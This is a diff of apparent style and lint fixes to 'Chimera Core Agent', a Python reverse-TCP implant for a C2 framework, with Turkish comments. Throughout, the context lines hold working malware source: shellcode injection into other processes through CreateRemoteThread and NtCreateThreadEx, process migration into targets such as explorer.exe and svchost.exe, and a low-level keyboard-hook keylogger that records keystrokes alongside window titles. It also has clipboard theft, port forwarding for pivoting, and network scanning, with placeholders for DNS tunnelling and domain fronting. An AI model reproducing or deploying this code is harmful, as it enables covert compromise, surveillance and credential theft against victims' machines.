@@ -3,32 +3,34 @@ Chimera Core Agent v0.1
 Mah Framework için geliştirilmiş temel reverse TCP ajanı.
 Sadece Python 3 standart kütüphaneleri kullanır.
 """
-import socket
-import subprocess
-import os
-import sys
-import platform
-import struct
-import time
-import ssl
-import random
-import string
-import types
+
 import base64
-import threading
+import contextlib
+import os
+import platform
+import random
 import shutil
+import socket
+import ssl
+import struct
+import subprocess
+import sys
+import threading
+import time
+import types
 
 # ============================================================
 # Konfigürasyon - generate.py tarafından doldurulacak
 # ============================================================
 LHOST = "{{LHOST}}"
 LPORT = {{LPORT}}
-RECONNECT_DELAY = 5      # Yeniden bağlanma bekleme süresi (saniye)
-MAX_RECONNECT = -1        # -1 = sınırsız yeniden bağlanma denemesi
-CHANNEL_TYPE = "{{CHANNEL_TYPE}}"          # https, dns, fronting, auto
-DNS_DOMAIN = "{{DNS_DOMAIN}}"              # DNS tünelleme domain'i (ör: c2.example.com)
-FRONTING_DOMAIN = "{{FRONTING_DOMAIN}}"    # Domain fronting CDN host'u (ör: cdn.example.com)
-
+RECONNECT_DELAY = 5  # Yeniden bağlanma bekleme süresi (saniye)
+MAX_RECONNECT = -1  # -1 = sınırsız yeniden bağlanma denemesi
+CHANNEL_TYPE = "{{CHANNEL_TYPE}}"  # https, dns, fronting, auto
+DNS_DOMAIN = "{{DNS_DOMAIN}}"  # DNS tünelleme domain'i (ör: c2.example.com)
+FRONTING_DOMAIN = (
+    "{{FRONTING_DOMAIN}}"  # Domain fronting CDN host'u (ör: cdn.example.com)
+)
 
 
 class ProcessInjector:
@@ -42,10 +44,10 @@ class ProcessInjector:
 
     # Windows sabitleri
     _PROCESS_ALL_ACCESS = 0x1F0FFF
-    _MEM_COMMIT         = 0x1000
-    _MEM_RESERVE        = 0x2000
+    _MEM_COMMIT = 0x1000
+    _MEM_RESERVE = 0x2000
     _PAGE_EXECUTE_READWRITE = 0x40
-    _MEM_RELEASE        = 0x8000
+    _MEM_RELEASE = 0x8000
 
     def _open_process(self, pid: int):
         """Hedef process'i PROCESS_ALL_ACCESS ile açar.
@@ -57,12 +59,9 @@ class ProcessInjector:
             return None
         try:
             import ctypes
+
             kernel32 = ctypes.windll.kernel32
-            handle = kernel32.OpenProcess(
-                self._PROCESS_ALL_ACCESS,
-                False,
-                pid
-            )
+            handle = kernel32.OpenProcess(self._PROCESS_ALL_ACCESS, False, pid)
             return handle if handle else None
         except Exception:
             return None
@@ -71,6 +70,7 @@ class ProcessInjector:
         """Windows HANDLE'ı kapatır."""
         try:
             import ctypes
+
             ctypes.windll.kernel32.CloseHandle(handle)
         except Exception:
             pass
@@ -91,7 +91,7 @@ class ProcessInjector:
             None,
             sc_len,
             self._MEM_COMMIT | self._MEM_RESERVE,
-            self._PAGE_EXECUTE_READWRITE
+            self._PAGE_EXECUTE_READWRITE,
         )
         if not remote_addr:
             return None, 0
@@ -104,10 +104,12 @@ class ProcessInjector:
             ctypes.c_void_p(remote_addr),
             sc_buf,
             sc_len,
-            ctypes.byref(written)
+            ctypes.byref(written),
         )
         if not ok or written.value != sc_len:
-            kernel32.VirtualFreeEx(h_process, ctypes.c_void_p(remote_addr), 0, self._MEM_RELEASE)
+            kernel32.VirtualFreeEx(
+                h_process, ctypes.c_void_p(remote_addr), 0, self._MEM_RELEASE
+            )
             return None, 0
 
         return remote_addr, sc_len
@@ -131,7 +133,6 @@ class ProcessInjector:
 
         try:
             import ctypes
-            from ctypes import wintypes
 
             kernel32 = ctypes.windll.kernel32
 
@@ -142,7 +143,9 @@ class ProcessInjector:
                 return f"[!] Process açılamadı (PID: {pid}). Hata kodu: {err}. Yeterli yetkiniz var mı?"
 
             try:
-                remote_addr, sc_len = self._alloc_and_write(kernel32, h_process, shellcode)
+                remote_addr, _sc_len = self._alloc_and_write(
+                    kernel32, h_process, shellcode
+                )
                 if not remote_addr:
                     err = kernel32.GetLastError()
                     return f"[!] Bellek tahsisi/yazma başarısız (PID: {pid}). Hata kodu: {err}"
@@ -152,7 +155,9 @@ class ProcessInjector:
                     result = self._nt_create_thread(h_process, remote_addr)
                 else:
                     # Klasik yöntem: CreateRemoteThread
-                    result = self._create_remote_thread(kernel32, h_process, remote_addr)
+                    result = self._create_remote_thread(
+                        kernel32, h_process, remote_addr
+                    )
 
                 return result
 
@@ -160,20 +165,14 @@ class ProcessInjector:
                 self._close_handle(h_process)
 
         except Exception as e:
-            return f"[!] Injection hatası: {str(e)}"
+            return f"[!] Injection hatası: {e!s}"
 
     def _create_remote_thread(self, kernel32, h_process, remote_addr) -> str:
         """Klasik CreateRemoteThread yöntemi ile uzak thread oluşturur."""
         import ctypes
 
         h_thread = kernel32.CreateRemoteThread(
-            h_process,
-            None,
-            0,
-            ctypes.c_void_p(remote_addr),
-            None,
-            0,
-            None
+            h_process, None, 0, ctypes.c_void_p(remote_addr), None, 0, None
         )
         if not h_thread:
             err = kernel32.GetLastError()
@@ -199,34 +198,34 @@ class ProcessInjector:
             #   ULONG CreateFlags, SIZE_T ZeroBits,
             #   SIZE_T StackSize, SIZE_T MaximumStackSize,
             #   PVOID AttributeList)
-            ntdll.NtCreateThreadEx.restype  = ctypes.c_ulong  # NTSTATUS
+            ntdll.NtCreateThreadEx.restype = ctypes.c_ulong  # NTSTATUS
             ntdll.NtCreateThreadEx.argtypes = [
                 ctypes.POINTER(ctypes.c_void_p),  # ThreadHandle (out)
-                ctypes.c_ulong,                    # DesiredAccess
-                ctypes.c_void_p,                   # ObjectAttributes
-                ctypes.c_void_p,                   # ProcessHandle
-                ctypes.c_void_p,                   # StartRoutine
-                ctypes.c_void_p,                   # Argument
-                ctypes.c_ulong,                    # CreateFlags
-                ctypes.c_size_t,                   # ZeroBits
-                ctypes.c_size_t,                   # StackSize
-                ctypes.c_size_t,                   # MaximumStackSize
-                ctypes.c_void_p,                   # AttributeList
+                ctypes.c_ulong,  # DesiredAccess
+                ctypes.c_void_p,  # ObjectAttributes
+                ctypes.c_void_p,  # ProcessHandle
+                ctypes.c_void_p,  # StartRoutine
+                ctypes.c_void_p,  # Argument
+                ctypes.c_ulong,  # CreateFlags
+                ctypes.c_size_t,  # ZeroBits
+                ctypes.c_size_t,  # StackSize
+                ctypes.c_size_t,  # MaximumStackSize
+                ctypes.c_void_p,  # AttributeList
             ]
 
             h_thread = ctypes.c_void_p(0)
             status = ntdll.NtCreateThreadEx(
                 ctypes.byref(h_thread),
-                0x1FFFFF,                 # THREAD_ALL_ACCESS
+                0x1FFFFF,  # THREAD_ALL_ACCESS
                 None,
                 ctypes.c_void_p(h_process),
                 ctypes.c_void_p(remote_addr),
                 None,
-                0,                        # CREATE_SUSPENDED yoksa 0
+                0,  # CREATE_SUSPENDED yoksa 0
                 0,
                 0,
                 0,
-                None
+                None,
             )
 
             if status != 0:
@@ -241,9 +240,11 @@ class ProcessInjector:
         except AttributeError:
             return "[!] NtCreateThreadEx bu sistemde kullanılamıyor, CreateRemoteThread kullanın."
         except Exception as e:
-            return f"[!] NtCreateThreadEx hatası: {str(e)}"
+            return f"[!] NtCreateThreadEx hatası: {e!s}"
 
-    def migrate(self, target_pid: int, current_shellcode_path: str = None) -> str:
+    def migrate(
+        self, target_pid: int, current_shellcode_path: str | None = None
+    ) -> str:
         """Mevcut agent'ı başka bir process'e migrate eder.
 
         Mevcut agent'ı (kendini) hedef process'e taşır:
@@ -298,24 +299,24 @@ class ProcessInjector:
                 return f"[!] Migration başarısız: {result}"
 
             # Shellcode yoksa bilgi ver
-            current_pid  = os.getpid()
+            current_pid = os.getpid()
             current_arch = "x64" if struct.calcsize("P") * 8 == 64 else "x86"
 
             info_lines = [
-                f"[*] Process Migration Hazır",
+                "[*] Process Migration Hazır",
                 f"    Mevcut Agent PID : {current_pid}",
                 f"    Hedef PID        : {target_pid}",
                 f"    Mimari           : {current_arch}",
-                f"    Durum            : Hedef process erişilebilir.",
+                "    Durum            : Hedef process erişilebilir.",
                 "",
-                f"[*] Kullanım:",
-                f"    inject_shellcode <PID> <HEX_SHELLCODE>   -- Shellcode enjekte et",
-                f"    inject_migrate   <PID> <SHELLCODE_HEX>   -- Shellcode ile migrate et",
+                "[*] Kullanım:",
+                "    inject_shellcode <PID> <HEX_SHELLCODE>   -- Shellcode enjekte et",
+                "    inject_migrate   <PID> <SHELLCODE_HEX>   -- Shellcode ile migrate et",
             ]
             return "\n".join(info_lines)
 
         except Exception as e:
-            return f"[!] Migration hatası: {str(e)}"
+            return f"[!] Migration hatası: {e!s}"
 
     def list_injectable_processes(self) -> str:
         """Enjeksiyona uygun process'leri listeler.
@@ -339,16 +340,16 @@ class ProcessInjector:
 
             class PROCESSENTRY32(ctypes.Structure):
                 _fields_ = [
-                    ("dwSize",              wintypes.DWORD),
-                    ("cntUsage",            wintypes.DWORD),
-                    ("th32ProcessID",       wintypes.DWORD),
-                    ("th32DefaultHeapID",   ctypes.POINTER(ctypes.c_ulong)),
-                    ("th32ModuleID",        wintypes.DWORD),
-                    ("cntThreads",          wintypes.DWORD),
+                    ("dwSize", wintypes.DWORD),
+                    ("cntUsage", wintypes.DWORD),
+                    ("th32ProcessID", wintypes.DWORD),
+                    ("th32DefaultHeapID", ctypes.POINTER(ctypes.c_ulong)),
+                    ("th32ModuleID", wintypes.DWORD),
+                    ("cntThreads", wintypes.DWORD),
                     ("th32ParentProcessID", wintypes.DWORD),
-                    ("pcPriClassBase",      ctypes.c_long),
-                    ("dwFlags",             wintypes.DWORD),
-                    ("szExeFile",           ctypes.c_char * 260),
+                    ("pcPriClassBase", ctypes.c_long),
+                    ("dwFlags", wintypes.DWORD),
+                    ("szExeFile", ctypes.c_char * 260),
                 ]
 
             h_snap = kernel32.CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
@@ -361,10 +362,18 @@ class ProcessInjector:
 
                 # Güvenli (enjeksiyona uygun) process'leri filtrele
                 safe_processes = [
-                    "explorer.exe", "notepad.exe", "mspaint.exe",
-                    "calc.exe",     "wordpad.exe",  "msiexec.exe",
-                    "svchost.exe",  "rundll32.exe", "dllhost.exe",
-                    "conhost.exe",  "taskhost.exe", "taskhostw.exe",
+                    "explorer.exe",
+                    "notepad.exe",
+                    "mspaint.exe",
+                    "calc.exe",
+                    "wordpad.exe",
+                    "msiexec.exe",
+                    "svchost.exe",
+                    "rundll32.exe",
+                    "dllhost.exe",
+                    "conhost.exe",
+                    "taskhost.exe",
+                    "taskhostw.exe",
                 ]
 
                 injectable = []
@@ -372,12 +381,16 @@ class ProcessInjector:
 
                 if kernel32.Process32First(h_snap, ctypes.byref(pe32)):
                     while True:
-                        exe_name = pe32.szExeFile.decode("cp1254", errors="ignore").lower()
-                        pid      = pe32.th32ProcessID
+                        exe_name = pe32.szExeFile.decode(
+                            "cp1254", errors="ignore"
+                        ).lower()
+                        pid = pe32.th32ProcessID
 
                         if pid != current_pid and exe_name in safe_processes:
                             # Handle açarak erişim kontrolü yap
-                            h_test = kernel32.OpenProcess(0x400, False, pid)  # PROCESS_QUERY_INFORMATION
+                            h_test = kernel32.OpenProcess(
+                                0x400, False, pid
+                            )  # PROCESS_QUERY_INFORMATION
                             if h_test:
                                 self._close_handle(h_test)
                                 injectable.append((pid, exe_name, pe32.cntThreads))
@@ -395,8 +408,8 @@ class ProcessInjector:
                 "=" * 55,
                 "  ENJEKSİYONA UYGUN PROCESS'LER",
                 "=" * 55,
-                f"  {'PID':<8} {'İSİM':<25} {'THREAD'}" ,
-                f"  {'-'*7} {'-'*24} {'-'*6}",
+                f"  {'PID':<8} {'İSİM':<25} {'THREAD'}",
+                f"  {'-' * 7} {'-' * 24} {'-' * 6}",
             ]
             for pid, name, threads in injectable:
                 lines.append(f"  {pid:<8} {name:<25} {threads}")
@@ -405,7 +418,7 @@ class ProcessInjector:
             return "\n".join(lines)
 
         except Exception as e:
-            return f"[!] Process listeleme hatası: {str(e)}"
+            return f"[!] Process listeleme hatası: {e!s}"
 
 
 class Keylogger:
@@ -413,29 +426,30 @@ class Keylogger:
     Windows için Ctypes tabanlı Keylogger.
     Arka planda (Thread) çalışır ve tuş vuruşlarını kaydeder.
     """
+
     def __init__(self):
         self.running = False
         self.logs = []
         self.thread = None
         self.hook = None
-        
+
         # Windows API Sabitleri ve Yapıları
         if sys.platform == "win32":
             import ctypes
-            from ctypes import windll, CFUNCTYPE, POINTER, c_int, c_void_p, byref
-            from ctypes.wintypes import DWORD, LPARAM, WPARAM, MSG
-            
+            from ctypes import CFUNCTYPE, c_int, c_void_p, windll
+            from ctypes.wintypes import DWORD, LPARAM, WPARAM
+
             self.user32 = windll.user32
             self.kernel32 = windll.kernel32
-            
+
             self.WH_KEYBOARD_LL = 13
             self.WM_KEYDOWN = 0x0100
             self.WM_SYSKEYDOWN = 0x0104
-            
+
             # Hook callback tipi
             # LRESULT callback(int nCode, WPARAM wParam, LPARAM lParam)
             self.HOOKPROC = CFUNCTYPE(c_int, c_int, WPARAM, LPARAM)
-            
+
             # KBDLLHOOKSTRUCT
             class KBDLLHOOKSTRUCT(ctypes.Structure):
                 _fields_ = [
@@ -443,40 +457,58 @@ class Keylogger:
                     ("scanCode", DWORD),
                     ("flags", DWORD),
                     ("time", DWORD),
-                    ("dwExtraInfo", c_void_p)
+                    ("dwExtraInfo", c_void_p),
                 ]
+
             self.KBDLLHOOKSTRUCT = KBDLLHOOKSTRUCT
-            
+
     def _get_key_name(self, vk_code):
         """Virtual Key Code'u okunabilir karaktere çevirir."""
         # Özel tuşlar haritası
         special_keys = {
-            8: "[BACKSPACE]", 9: "[TAB]", 13: "[ENTER]", 27: "[ESC]",
-            32: " ", 160: "[LSHIFT]", 161: "[RSHIFT]", 
-            162: "[LCTRL]", 163: "[RCTRL]", 164: "[LALT]", 165: "[RALT]",
-            20: "[CAPS]", 46: "[DEL]", 37: "[LEFT]", 38: "[UP]", 
-            39: "[RIGHT]", 40: "[DOWN]", 91: "[WIN]", 92: "[WIN]"
+            8: "[BACKSPACE]",
+            9: "[TAB]",
+            13: "[ENTER]",
+            27: "[ESC]",
+            32: " ",
+            160: "[LSHIFT]",
+            161: "[RSHIFT]",
+            162: "[LCTRL]",
+            163: "[RCTRL]",
+            164: "[LALT]",
+            165: "[RALT]",
+            20: "[CAPS]",
+            46: "[DEL]",
+            37: "[LEFT]",
+            38: "[UP]",
+            39: "[RIGHT]",
+            40: "[DOWN]",
+            91: "[WIN]",
+            92: "[WIN]",
         }
-        
+
         if vk_code in special_keys:
             return special_keys[vk_code]
-        
+
         # Standart karakterler
         try:
             # Klavye düzenini al
             keyboard_layout = self.user32.GetKeyboardLayout(0)
-            
+
             # Karakter bufferı
             import ctypes
+
             buff = ctypes.create_unicode_buffer(16)
-            
+
             # Tuş durumunu al (Shift, Caps Lock vb. için)
             keys_state = (ctypes.c_byte * 256)()
             self.user32.GetKeyboardState(ctypes.byref(keys_state))
-            
+
             # ToUnicodeEx ile çevir
-            ret = self.user32.ToUnicodeEx(vk_code, 0, keys_state, buff, len(buff), 0, keyboard_layout)
-            
+            ret = self.user32.ToUnicodeEx(
+                vk_code, 0, keys_state, buff, len(buff), 0, keyboard_layout
+            )
+
             if ret > 0:
                 char = buff.value
                 # Basılamayan karakterleri filtrele
@@ -485,7 +517,7 @@ class Keylogger:
                 return char
         except:
             pass
-            
+
         # Fallback: ASCII/Chr
         if 32 < vk_code < 127:
             return chr(vk_code)
@@ -495,33 +527,37 @@ class Keylogger:
         """Windows Hook Callback Fonksiyonu."""
         if nCode >= 0 and (wParam == self.WM_KEYDOWN or wParam == self.WM_SYSKEYDOWN):
             import ctypes
+
             # lParam aslında KBDLLHOOKSTRUCT pointer'ı
-            kb_struct = ctypes.cast(lParam, ctypes.POINTER(self.KBDLLHOOKSTRUCT)).contents
-            
+            kb_struct = ctypes.cast(
+                lParam, ctypes.POINTER(self.KBDLLHOOKSTRUCT)
+            ).contents
+
             try:
                 key_name = self._get_key_name(kb_struct.vkCode)
-                
+
                 # Pencere başlığını al
                 active_window_title = self._get_active_window_title()
-                
+
                 # Log formatı: [Pencere] Tuş
                 timestamp = time.strftime("%H:%M:%S")
-                log_entry = f"[{timestamp}] {active_window_title} -> {key_name}"
-                
+
                 # Basitçe tuşları birleştir (daha okunaklı olması için)
                 # Eğer son log aynı penceredeyse sadece tuşu ekle
-                if self.logs and self.logs[-1]['window'] == active_window_title:
-                    self.logs[-1]['keys'] += key_name
+                if self.logs and self.logs[-1]["window"] == active_window_title:
+                    self.logs[-1]["keys"] += key_name
                 else:
-                    self.logs.append({
-                        'timestamp': timestamp,
-                        'window': active_window_title,
-                        'keys': key_name
-                    })
-                    
-            except Exception as e:
+                    self.logs.append(
+                        {
+                            "timestamp": timestamp,
+                            "window": active_window_title,
+                            "keys": key_name,
+                        }
+                    )
+
+            except Exception:
                 pass
-                
+
         # Zincirdeki bir sonraki hook'a pasla
         return self.user32.CallNextHookEx(self.hook, nCode, wParam, lParam)
 
@@ -531,6 +567,7 @@ class Keylogger:
             hwnd = self.user32.GetForegroundWindow()
             length = self.user32.GetWindowTextLengthW(hwnd)
             import ctypes
+
             buff = ctypes.create_unicode_buffer(length + 1)
             self.user32.GetWindowTextW(hwnd, buff, length + 1)
             return buff.value if buff.value else "Unknown Window"
@@ -539,27 +576,23 @@ class Keylogger:
 
     def _start_impl(self):
         """Keylogger thread fonksiyonu."""
-        import ctypes
         from ctypes import byref
         from ctypes.wintypes import MSG
-        
+
         # Callback'i sakla (GC tarafından silinmemesi için)
         self.callback = self.HOOKPROC(self._hook_proc)
-        
+
         # Hook kur (WH_KEYBOARD_LL = 13)
         # GetModuleHandle(None) -> Current modules handle
         h_mod = self.kernel32.GetModuleHandleW(None)
-        
+
         self.hook = self.user32.SetWindowsHookExA(
-            self.WH_KEYBOARD_LL, 
-            self.callback, 
-            h_mod, 
-            0
+            self.WH_KEYBOARD_LL, self.callback, h_mod, 0
         )
-        
+
         if not self.hook:
             return
-            
+
         # Mesaj döngüsü (Message Pump)
         msg = MSG()
         while self.running:
@@ -568,9 +601,9 @@ class Keylogger:
             # O yüzden PeekMessage + sleep kullanabiliriz veya GetMessage kullanıp
             # durdururken PostThreadMessage atarız.
             # Basitlik için GetMessage kullanalım.
-            
+
             # Thread durdurma kontrolü için PeekMessage daha güvenli
-            if self.user32.PeekMessageW(byref(msg), 0, 0, 0, 1): # PM_REMOVE = 1
+            if self.user32.PeekMessageW(byref(msg), 0, 0, 0, 1):  # PM_REMOVE = 1
                 self.user32.TranslateMessage(byref(msg))
                 self.user32.DispatchMessageW(byref(msg))
             else:
@@ -584,9 +617,9 @@ class Keylogger:
         """Keylogger'ı başlatır."""
         if self.running or sys.platform != "win32":
             return False
-            
+
         self.running = True
-        self.logs = [] # Logları temizle
+        self.logs = []  # Logları temizle
         self.thread = threading.Thread(target=self._start_impl, daemon=True)
         self.thread.start()
         return True
@@ -595,7 +628,7 @@ class Keylogger:
         """Keylogger'ı durdurur."""
         if not self.running:
             return False
-        
+
         self.running = False
         if self.thread:
             self.thread.join(timeout=1)
@@ -606,38 +639,40 @@ class Keylogger:
         """Biriken logları döner ve temizler."""
         if not self.logs:
             return "Log yok."
-            
+
         output = []
         output.append("-" * 40)
         output.append(f"KEYLOGGER DUMP ({len(self.logs)} Entries)")
         output.append("-" * 40)
-        
+
         for entry in self.logs:
             output.append(f"[{entry['timestamp']}] [{entry['window']}]")
             output.append(f"{entry['keys']}")
             output.append("")
-            
-        self.logs = [] # Okunanları sil
+
+        self.logs = []  # Okunanları sil
         return "\n".join(output)
+
 
 class ClipboardManager:
     """
     Platform bağımsız panoya erişim yöneticisi.
     Windows (ctypes), macOS (pbcopy/pbpaste), Linux (xclip/xsel).
     """
+
     def get_text(self):
         """Panodaki metni okur."""
         if sys.platform == "win32":
             try:
                 import ctypes
-                from ctypes import windll, c_char_p, c_wchar_p
-                
+                from ctypes import windll
+
                 user32 = windll.user32
                 kernel32 = windll.kernel32
-                
+
                 if not user32.OpenClipboard(None):
                     return "[!] Pano açılamadı (Meşgul olabilir)."
-                
+
                 try:
                     # CF_UNICODETEXT = 13
                     h_data = user32.GetClipboardData(13)
@@ -646,37 +681,45 @@ class ClipboardManager:
                         h_data = user32.GetClipboardData(1)
                         if not h_data:
                             return "[!] Pano boş veya metin içermiyor."
-                    
+
                     p_text = kernel32.GlobalLock(h_data)
                     if not p_text:
                         return "[!] Veri kilitlenemedi."
-                        
+
                     try:
                         text = ctypes.c_wchar_p(p_text).value
                     except:
-                        text = ctypes.c_char_p(p_text).value.decode('cp1254', errors='ignore')
-                        
+                        text = ctypes.c_char_p(p_text).value.decode(
+                            "cp1254", errors="ignore"
+                        )
+
                 finally:
                     kernel32.GlobalUnlock(h_data)
                     user32.CloseClipboard()
-                
+
                 return text
             except Exception as e:
-                return f"[!] Pano okuma hatası: {str(e)}"
-                
+                return f"[!] Pano okuma hatası: {e!s}"
+
         elif sys.platform == "darwin":
             try:
-                return subprocess.check_output("pbpaste", shell=True).decode('utf-8')
+                return subprocess.check_output("pbpaste", shell=True).decode("utf-8")
             except:
                 return "[!] pbpaste komutu çalışmadı."
-                
-        else: # Linux
+
+        else:  # Linux
             try:
                 # xclip veya xsel dene
                 try:
-                    return subprocess.check_output("xclip -o -selection clipboard", shell=True, stderr=subprocess.DEVNULL).decode('utf-8')
+                    return subprocess.check_output(
+                        "xclip -o -selection clipboard",
+                        shell=True,
+                        stderr=subprocess.DEVNULL,
+                    ).decode("utf-8")
                 except:
-                    return subprocess.check_output("xsel -o -b", shell=True, stderr=subprocess.DEVNULL).decode('utf-8')
+                    return subprocess.check_output(
+                        "xsel -o -b", shell=True, stderr=subprocess.DEVNULL
+                    ).decode("utf-8")
             except:
                 return "[!] Linux panosuna erişilemedi (xclip/xsel yüklü mü?)."
 
@@ -685,68 +728,72 @@ class ClipboardManager:
         if sys.platform == "win32":
             try:
                 import ctypes
-                from ctypes import windll, c_size_t
-                
+                from ctypes import windll
+
                 user32 = windll.user32
                 kernel32 = windll.kernel32
-                
+
                 if not user32.OpenClipboard(None):
                     return False
-                
+
                 try:
                     user32.EmptyClipboard()
-                    
+
                     # Metni belleğe hazırla
-                    text_bytes = text.encode('utf-16le') + b'\x00\x00'
+                    text_bytes = text.encode("utf-16le") + b"\x00\x00"
                     alloc_size = len(text_bytes)
-                    
+
                     # GHND = 0x0042 (GMEM_MOVEABLE | GMEM_ZEROINIT)
                     h_mem = kernel32.GlobalAlloc(0x0042, alloc_size)
                     p_mem = kernel32.GlobalLock(h_mem)
-                    
+
                     ctypes.memmove(p_mem, text_bytes, alloc_size)
                     kernel32.GlobalUnlock(h_mem)
-                    
+
                     # CF_UNICODETEXT = 13
                     if not user32.SetClipboardData(13, h_mem):
-                         return False
+                        return False
                 finally:
                     user32.CloseClipboard()
                 return True
             except:
                 return False
-                
+
         elif sys.platform == "darwin":
             try:
                 p = subprocess.Popen("pbcopy", stdin=subprocess.PIPE, shell=True)
-                p.communicate(input=text.encode('utf-8'))
+                p.communicate(input=text.encode("utf-8"))
                 return p.returncode == 0
             except:
                 return False
-                
-        else: # Linux
+
+        else:  # Linux
             try:
                 # xclip
-                p = subprocess.Popen("xclip -selection clipboard", stdin=subprocess.PIPE, shell=True)
-                p.communicate(input=text.encode('utf-8'))
-                if p.returncode == 0: return True
+                p = subprocess.Popen(
+                    "xclip -selection clipboard", stdin=subprocess.PIPE, shell=True
+                )
+                p.communicate(input=text.encode("utf-8"))
+                if p.returncode == 0:
+                    return True
             except:
                 pass
-                
+
             try:
                 # xsel fallback
                 p = subprocess.Popen("xsel -b -i", stdin=subprocess.PIPE, shell=True)
-                p.communicate(input=text.encode('utf-8'))
+                p.communicate(input=text.encode("utf-8"))
                 return p.returncode == 0
             except:
                 return False
+
 
 # ============================================================
 # Port Forwarding (Tünelleme) Modülü
 # ============================================================
 class PortForwarder:
     """Agent tarafında port forwarding (tünel) yöneticisi.
-    
+
     Local Port Forwarding mantığı:
     - Agent üzerinde bir dinleyici soket açılır (bind_host:bind_port).
     - Handler'dan "portfwd add" komutu geldiğinde agent yerel ağındaki hedef
@@ -755,20 +802,21 @@ class PortForwarder:
     """
 
     def __init__(self):
-        self._tunnels = {}      # id -> {"thread", "server_sock", "stop_event", "info"}
+        self._tunnels = {}  # id -> {"thread", "server_sock", "stop_event", "info"}
         self._next_id = 1
         self._lock = threading.Lock()
 
     # ----------------------------------------------------------
-    def add(self, bind_host: str, bind_port: int,
-            remote_host: str, remote_port: int) -> str:
+    def add(
+        self, bind_host: str, bind_port: int, remote_host: str, remote_port: int
+    ) -> str:
         """Yeni bir port forwarding tüneli başlatır."""
         try:
             server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             server_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
             server_sock.bind((bind_host, bind_port))
             server_sock.listen(5)
-            server_sock.settimeout(1.0)   # accept() timeout (stop kontrolü için)
+            server_sock.settimeout(1.0)  # accept() timeout (stop kontrolü için)
         except Exception as e:
             return f"[!] Port forwarding başlatılamadı ({bind_host}:{bind_port}): {e}"
 
@@ -785,22 +833,22 @@ class PortForwarder:
                         if not data:
                             break
                         dst.sendall(data)
-                    except socket.timeout:
+                    except TimeoutError:
                         continue
                     except Exception:
                         break
             finally:
-                try: src.close()
-                except: pass
-                try: dst.close()
-                except: pass
+                with contextlib.suppress(BaseException):
+                    src.close()
+                with contextlib.suppress(BaseException):
+                    dst.close()
 
         def _accept_loop():
             """Gelen bağlantıları kabul eder ve relay thread'lerini oluşturur."""
             while not stop_event.is_set():
                 try:
                     client_conn, _ = server_sock.accept()
-                except socket.timeout:
+                except TimeoutError:
                     continue
                 except Exception:
                     break
@@ -811,19 +859,27 @@ class PortForwarder:
                     remote_sock.settimeout(10)
                     remote_sock.connect((remote_host, remote_port))
                 except Exception:
-                    try: client_conn.close()
-                    except: pass
+                    with contextlib.suppress(BaseException):
+                        client_conn.close()
                     continue
 
                 # Çift yönlü relay
-                t1 = threading.Thread(target=_relay, args=(client_conn, remote_sock, stop_event), daemon=True)
-                t2 = threading.Thread(target=_relay, args=(remote_sock, client_conn, stop_event), daemon=True)
+                t1 = threading.Thread(
+                    target=_relay,
+                    args=(client_conn, remote_sock, stop_event),
+                    daemon=True,
+                )
+                t2 = threading.Thread(
+                    target=_relay,
+                    args=(remote_sock, client_conn, stop_event),
+                    daemon=True,
+                )
                 t1.start()
                 t2.start()
 
             # Temizlik
-            try: server_sock.close()
-            except: pass
+            with contextlib.suppress(BaseException):
+                server_sock.close()
 
         t = threading.Thread(target=_accept_loop, daemon=True)
         t.start()
@@ -853,8 +909,8 @@ class PortForwarder:
             tunnel = self._tunnels.pop(tunnel_id)
 
         tunnel["stop_event"].set()
-        try: tunnel["server_sock"].close()
-        except: pass
+        with contextlib.suppress(BaseException):
+            tunnel["server_sock"].close()
         return f"[+] Port forwarding #{tunnel_id} kaldırıldı."
 
     # ----------------------------------------------------------
@@ -966,10 +1022,8 @@ class NetworkScanner:
                 except ValueError:
                     pass
             else:
-                try:
+                with contextlib.suppress(ValueError):
                     ports.append(int(part))
-                except ValueError:
-                    pass
         return sorted(set(ports))
 
     # ── Tek IP Ping (subprocess) ─────────────────────────────────
@@ -989,8 +1043,7 @@ class NetworkScanner:
 
             result = subprocess.run(
                 ["ping", param, "1", t_param, t_val, ip],
-                stdout=subprocess.PIPE,
-                stderr=subprocess.PIPE,
+                capture_output=True,
                 startupinfo=startupinfo,
                 timeout=timeout + 2,
             )
@@ -1074,18 +1127,18 @@ class NetworkScanner:
                 broadcast = f"{octets[0]}.{octets[1]}.{octets[2]}.255"
                 subprocess.run(
                     ["ping", "-c", "1", "-W", "1", "-b", broadcast],
-                    stdout=subprocess.PIPE, stderr=subprocess.PIPE, timeout=3,
+                    capture_output=True,
+                    timeout=3,
                 )
             else:
                 ips = self._cidr_to_ips(cidr)
                 for ip in ips[:20]:
-                    try:
+                    with contextlib.suppress(Exception):
                         subprocess.run(
                             ["ping", "-n", "1", "-w", "200", ip],
-                            stdout=subprocess.PIPE, stderr=subprocess.PIPE, timeout=2,
+                            capture_output=True,
+                            timeout=2,
                         )
-                    except Exception:
-                        pass
         except Exception:
             pass
 
@@ -1099,12 +1152,17 @@ class NetworkScanner:
 
             result = subprocess.run(
                 ["arp", "-a"],
-                stdout=subprocess.PIPE, stderr=subprocess.PIPE,
-                startupinfo=startupinfo, timeout=10,
+                capture_output=True,
+                startupinfo=startupinfo,
+                timeout=10,
             )
 
             try:
-                arp_output = result.stdout.decode("cp1254") if sys.platform == "win32" else result.stdout.decode("utf-8")
+                arp_output = (
+                    result.stdout.decode("cp1254")
+                    if sys.platform == "win32"
+                    else result.stdout.decode("utf-8")
+                )
             except Exception:
                 arp_output = result.stdout.decode("utf-8", errors="ignore")
 
@@ -1142,7 +1200,12 @@ class NetworkScanner:
                         except (IndexError, ValueError):
                             pass
 
-                if ip and mac and mac.lower() not in ("(incomplete)", "<incomplete>", "ff:ff:ff:ff:ff:ff"):
+                if (
+                    ip
+                    and mac
+                    and mac.lower()
+                    not in ("(incomplete)", "<incomplete>", "ff:ff:ff:ff:ff:ff")
+                ):
                     entries.append((ip, mac))
 
             if not entries:
@@ -1160,11 +1223,16 @@ class NetworkScanner:
         except subprocess.TimeoutExpired:
             return "[!] ARP tablosu okuma zaman aşımı."
         except Exception as e:
-            return f"[!] ARP scan hatası: {str(e)}"
+            return f"[!] ARP scan hatası: {e!s}"
 
     # ── Port Scan (TCP Connect) ─────────────────────────────────
-    def port_scan(self, host: str, port_range: str = "1-1024",
-                  timeout: float = 0.5, max_threads: int = 200) -> str:
+    def port_scan(
+        self,
+        host: str,
+        port_range: str = "1-1024",
+        timeout: float = 0.5,
+        max_threads: int = 200,
+    ) -> str:
